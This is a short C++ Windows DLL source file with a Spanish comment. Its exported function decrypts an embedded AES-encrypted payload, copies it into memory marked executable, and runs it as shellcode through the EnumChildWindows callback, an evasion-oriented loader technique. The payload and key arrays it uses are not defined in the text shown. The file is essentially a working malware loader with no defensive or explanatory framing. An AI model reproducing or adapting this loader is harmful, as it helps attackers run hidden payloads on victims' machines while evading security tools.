// dllmain.cpp : Define el punto de entrada de la aplicación DLL.
#include "pch.h"
#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")


#ifndef SAL
#define SAL

#endif
unsigned int payload_len = sizeof(payload);

int AESDecrypt(BYTE* payload, unsigned int payload_len, BYTE* key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
		return -1;
	}
	if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {
		return -1;
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
		return -1;
	}

	if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)payload, (DWORD*)&payload_len)) {
		return -1;
	}

	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);

	return 0;
}

extern "C" __declspec(dllexport) void Pruebas() {
    AESDecrypt((BYTE*)payload, payload_len, (BYTE*)key, sizeof(key));

    LPVOID addr = ::VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT, PAGE_READWRITE);
    ::RtlMoveMemory(addr, payload, sizeof(payload));


    DWORD oldProtect = 0;
    BOOL res = VirtualProtect(addr, payload_len, PAGE_EXECUTE_READ, &oldProtect);

    ::EnumChildWindows(NULL, (WNDENUMPROC)addr, NULL);

}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

